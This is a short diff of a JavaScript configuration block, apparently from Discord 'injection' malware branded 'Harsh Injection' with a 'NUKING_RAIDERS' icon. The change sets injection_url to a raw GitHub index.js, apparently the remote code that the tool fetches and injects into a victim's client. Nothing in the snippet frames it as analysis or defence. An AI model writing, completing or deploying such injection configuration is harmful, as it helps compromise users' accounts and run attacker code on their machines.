@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Harsh Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1001847276030935062/1005894920936095824/NUKING_RAIDERS.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/Harshxd9836/Harsh/master/index.js', 
   /**
    
    **/
